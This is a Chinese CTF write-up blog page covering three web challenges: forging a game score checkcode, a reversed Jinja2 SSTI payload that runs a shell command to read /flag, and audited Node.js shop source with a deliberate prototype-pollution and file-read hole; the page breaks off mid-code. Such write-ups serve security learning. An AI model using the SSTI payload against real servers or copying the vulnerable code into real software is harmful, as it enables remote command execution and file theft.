@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>DASCTF 五月出题人挑战赛 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="DASCTF 五月出题人挑战赛 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/DASCTF%20X%20CBCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T10:31:26.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">DASCTF 五月出题人挑战赛</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>弥补一下入门的遗憾，当时睡过头了错过了这场比赛，还是很像再试试的</p>
+<h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>考点：前端JS<br>一个3D小游戏，直奔JS去分析，在死亡时抓包会看到以下内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669994937651-aafb381d-924c-4efd-93c7-bf0b3d8aa8f0.png#averageHue=%23f7f7f7&clientId=u3d8142fa-9ce0-4&from=paste&height=200&id=uc7ecb0e3&name=image.png&originHeight=250&originWidth=1030&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29294&status=done&style=none&taskId=uefa19369-a705-48e5-80be-7e0e18008ff&title=&width=824" alt="image.png"><br>score就是成绩，checkcode验证码，tm这个一眼时间戳吧<br>现在思路就分为下面的三点了</p>
+<ul>
+<li>伪造score</li>
+<li>伪造checkcode</li>
+<li>爆破时间戳</li>
+</ul>
+<p>我们在js中全局搜索一下checkcode：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995145865-b0d2f06e-bbb2-402f-8dc2-7ec229e8c6bc.png#averageHue=%23fbf7e6&clientId=u3d8142fa-9ce0-4&from=paste&height=39&id=u2b0cbc2a&name=image.png&originHeight=49&originWidth=346&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5899&status=done&style=none&taskId=u785bc4d0-f567-419e-b8ba-6a89542a592&title=&width=276.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995151800-9d4ffbc6-5d63-44a6-b6c7-c3222603a59e.png#averageHue=%23e7d747&clientId=u3d8142fa-9ce0-4&from=paste&height=39&id=ub54c8bcc&name=image.png&originHeight=49&originWidth=301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4296&status=done&style=none&taskId=ua07ffd63-8d92-409b-aaed-15728b50133&title=&width=240.8" alt="image.png"><br>得到了2个有用信息，然后还发现了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995175644-61c75da6-f34d-4176-a81f-8fd3f0535e3a.png#averageHue=%23fefdfc&clientId=u3d8142fa-9ce0-4&from=paste&height=162&id=u57665fb1&name=image.png&originHeight=202&originWidth=1182&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20145&status=done&style=none&taskId=u34b29bbe-140a-455d-86c5-e45e6e7601e&title=&width=945.6" alt="image.png"><br>唯一不清楚的就是那个t是什么，我们搜索一下sn这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995196814-df764655-d3cb-40bd-8416-d3c810185b20.png#averageHue=%23fdfcf8&clientId=u3d8142fa-9ce0-4&from=paste&height=63&id=u8c6a8134&name=image.png&originHeight=79&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7058&status=done&style=none&taskId=u3845b019-b6c2-4514-be71-03a24959519&title=&width=392" alt="image.png"><br>发现被调用过一次，第二个参数就是checkcode，所以t就是上面的checkcode，即为<br><code>DASxCBCTF_wElc03e</code><br>接下来就是伪造一下checkcode了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995226730-529d5cf6-040c-4e20-8d0a-26f3cf236007.png#averageHue=%23fcfcfb&clientId=u3d8142fa-9ce0-4&from=paste&height=244&id=u909cd531&name=image.png&originHeight=305&originWidth=1483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26181&status=done&style=none&taskId=u92b1009f-bbf1-4431-99ec-800f11b0c55&title=&width=1186.4" alt="image.png"><br><code>8140de91e819b6525c5e872921ff86b1</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995241981-f37a8857-2d6a-4224-b0f1-d371470c9c41.png#averageHue=%23f5f5f5&clientId=u3d8142fa-9ce0-4&from=paste&height=219&id=u35ec19c6&name=image.png&originHeight=274&originWidth=784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31107&status=done&style=none&taskId=u7078a124-ba01-4799-918a-e3c67527e67&title=&width=627.2" alt="image.png"><br>爆破一下时间戳<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995253626-aa78e9a6-25aa-4b45-8f69-f969febdd90e.png#averageHue=%23f7f7f7&clientId=u3d8142fa-9ce0-4&from=paste&height=105&id=u01c29786&name=image.png&originHeight=131&originWidth=713&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12784&status=done&style=none&taskId=u596a5fcf-e16c-4cd9-9401-d04c0768a54&title=&width=570.4" alt="image.png"><br>可以得到答案</p>
+<h2 id="Text-Reverser"><a href="#Text-Reverser" class="headerlink" title="Text Reverser"></a>Text Reverser</h2><p>考点：简单的SSTI<br>他会先进行逆序，所以我们要反转一下payload：<br><code>&#123;%print(lipsum.__globals__.os.popen('more /flag').read())%&#125;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669995801053-288713af-6cc0-4cde-9aff-ac85c93b182c.png#averageHue=%23fcfbfb&clientId=u3d8142fa-9ce0-4&from=paste&height=284&id=u8a0a87a3&name=image.png&originHeight=355&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15771&status=done&style=none&taskId=u7ec1ea4e-41e3-484b-93bc-e7e0413672f&title=&width=913.6" alt="image.png"></p>
+<h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>考点：Node.js原型污染,一些node和json的小tips<br>开局给源码审计：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const session = require(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line">const bodyParse = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">const app = express();</span><br><span class="line">const PORT = process.env.PORT || <span class="number">80</span>;</span><br><span class="line">const SECRET = process.env.SECRET || <span class="string">&quot;cybershop_challenge_secret&quot;</span></span><br><span class="line"></span><br><span class="line">const adminUser = &#123;</span><br><span class="line">    username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    password: <span class="string">&quot;😀admin😀&quot;</span>,</span><br><span class="line">    money: <span class="number">9999</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(bodyParse.urlencoded(&#123;extended: false&#125;));</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    secret: SECRET,  </span><br><span class="line">    saveUninitialized: false,  </span><br><span class="line">    resave: false, </span><br><span class="line">    cookie: &#123; maxAge: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.use(express.static(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/isLogin&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.username) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            code: <span class="number">2</span>,</span><br><span class="line">            username: req.session.username,</span><br><span class="line">            money: req.session.money</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;code: <span class="number">0</span>, msg: <span class="string">&#x27;Please login!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/login&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    let username = req.body.username;</span><br><span class="line">    let password = req.body.password;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&#x27;string&#x27;</span> || username === <span class="string">&#x27;&#x27;</span> || typeof password !== <span class="string">&#x27;string&#x27;</span> || password === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;code: <span class="number">4</span>, msg: <span class="string">&#x27;illegal username or password!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username === adminUser.username &amp;&amp; password === adminUser.password.substring(<span class="number">1</span>,<span class="number">6</span>)) &#123;//only admin need password</span><br><span class="line">        req.session.username = username;</span><br><span class="line">        req.session.money = adminUser.money;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            code: <span class="number">1</span>,</span><br><span class="line">            username: username,</span><br><span class="line">            money: req.session.money,</span><br><span class="line">            msg: <span class="string">&#x27;admin login success!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.username = username;</span><br><span class="line">    req.session.money = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        code: <span class="number">1</span>,</span><br><span class="line">        username: username,</span><br><span class="line">        money: req.session.money,</span><br><span class="line">        msg: `$&#123;username&#125; login success!`</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/changeUsername&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.username) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            code: <span class="number">0</span>,</span><br><span class="line">            msg: <span class="string">&#x27;please login!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    let username = req.body.username;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&#x27;string&#x27;</span> || username === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;code: <span class="number">4</span>, msg: <span class="string">&#x27;illegal username!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.username = username;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        code: <span class="number">2</span>,</span><br><span class="line">        username: username,</span><br><span class="line">        money: req.session.money,</span><br><span class="line">        msg: <span class="string">&#x27;Username change success&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//购买商品的接口</span><br><span class="line">function buyApi(user, product) &#123;</span><br><span class="line">    let order = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(!order[user.username]) &#123;</span><br><span class="line">        order[user.username] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object.assign(order[user.username], product);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(product.<span class="built_in">id</span> === <span class="number">1</span>) &#123;             //buy fakeFlag</span><br><span class="line">        <span class="keyword">if</span>(user.money &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            user.money -= <span class="number">10</span>;</span><br><span class="line">            Object.assign(order, &#123; msg:  fs.readFileSync(<span class="string">&#x27;/fakeFlag&#x27;</span>).toString() &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Object.assign(order,&#123; msg: <span class="string">&quot;you don&#x27;t have enough money!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(product.<span class="built_in">id</span> === <span class="number">2</span>) &#123;        //buy flag</span><br><span class="line">        <span class="keyword">if</span>(user.money &gt;= <span class="number">11</span> &amp;&amp; user.token) &#123;  //do u have token?</span><br><span class="line">            <span class="keyword">if</span>(JSON.stringify(product).includes(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">                Object.assign(order,&#123; msg: <span class="string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                user.money -= <span class="number">11</span>;</span><br><span class="line">                Object.assign(order,&#123; msg: fs.readFileSync(product.name).toString() &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            Object.assign(order,&#123; msg: <span class="string">&quot;nononono!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        Object.assign(order,&#123; code: <span class="number">0</span>, msg: <span class="string">&quot;no such product!&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    Object.assign(order, &#123; username: user.username, code: <span class="number">3</span>, money: user.money &#125;);</span><br><span class="line">    <span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/buy&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.username) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            code: <span class="number">0</span>,</span><br><span class="line">            msg: <span class="string">&#x27;please login!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    var user = &#123;</span><br><span class="line">        username: req.session.username,</span><br><span class="line">        money: req.session.money</span><br><span class="line">    &#125;;</span><br><span class="line">    var order = buyApi(user, req.body);</span><br><span class="line">    req.session.money = user.money;</span><br><span class="line">    res.json(order);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/logout&#x27;</span>, function(req, res) &#123;</span><br><span class="line">    req.session.destroy();</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        code: <span class="number">0</span>,</span><br><span class="line">        msg: <span class="string">&#x27;logout success!&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; &#123;console.log(`APP RUN IN $&#123;PORT&#125;`)&#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">function displayChange(data) &#123;</span><br><span class="line">    let anonymous =  document.querySelector(<span class="string">&#x27;#anonymous&#x27;</span>);</span><br><span class="line">    let user = document.querySelector(<span class="string">&#x27;#user&#x27;</span>);</span><br><span class="line">    let money = document.querySelector(<span class="string">&#x27;#money&#x27;</span>);</span><br><span class="line">    let welcome = document.querySelector(<span class="string">&#x27;#welcome&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(data.code) &#123;</span><br><span class="line">       <span class="keyword">if</span>(data.code === <span class="number">4</span>) &#123;</span><br><span class="line">           alert(data.msg);</span><br><span class="line">           <span class="keyword">return</span></span><br><span class="line">       &#125;</span><br><span class="line">       alert(data.msg);</span><br><span class="line">       anonymous.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">       user.style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">       money.innerText = `Money: ￥$&#123;data.money&#125;`;</span><br><span class="line">       welcome.innerText = `Welcome: $&#123;data.username&#125;`;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(data.msg);</span><br><span class="line">        anonymous.style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#change_btn&#x27;</span>).style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#login_btn&#x27;</span>).style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#password&#x27;</span>).style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#lc&#x27;</span>).innerText = <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">        user.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        money.innerText = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        welcome.innerText = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(function() &#123;</span><br><span class="line">    fetch(<span class="string">&#x27;/isLogin&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;GET&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .then(response =&gt; response.json())</span><br><span class="line">    .then(data =&gt; displayChange(data));</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function login() &#123;</span><br><span class="line">    let username = document.querySelector(<span class="string">&quot;input[name=username]&quot;</span>).value;</span><br><span class="line">    let password = document.querySelector(<span class="string">&quot;input[name=password]&quot;</span>).value;</span><br><span class="line">    fetch(<span class="string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        body: JSON.stringify(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(response =&gt; response.json())</span><br><span class="line">    .then(data =&gt; displayChange(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function logout() &#123;</span><br><span class="line">    fetch(<span class="string">&#x27;/logout&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;GET&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .then(response =&gt; response.json())</span><br><span class="line">    .then(data =&gt; displayChange(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function changeUsername() &#123;</span><br><span class="line">    let username = document.querySelector(<span class="string">&quot;input[name=username]&quot;</span>).value;</span><br><span class="line">    let anonymous =  document.querySelector(<span class="string">&#x27;#anonymous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(anonymous.style.display == <span class="string">&#x27;none&#x27;</span>) &#123;</span><br><span class="line">        anonymous.style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#login_btn&#x27;</span>).style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#user&#x27;</span>).style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#change_btn&#x27;</span>).style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#password&#x27;</span>).style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        document.querySelector(<span class="string">&#x27;#lc&#x27;</span>).innerText = <span class="string">&#x27;change username&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        fetch(<span class="string">&#x27;/changeUsername&#x27;</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            headers: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            body: JSON.stringify(&#123;<span class="string">&#x27;username&#x27;</span>: username&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(response =&gt; response.json())</span><br><span class="line">        .then(data =&gt; displayChange(data));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function buy(product) &#123;</span><br><span class="line">    fetch(<span class="string">&#x27;/buy&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        body: JSON.stringify(&#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;/&#x27;</span> + product.name, </span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: Number(product.getAttribute(<span class="string">&#x27;idNum&#x27;</span>))</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(response =&gt; response.json())</span><br><span class="line">    .then(data =&gt; displayChange(data));</span><br><span class="line">&#125;</span><br><span 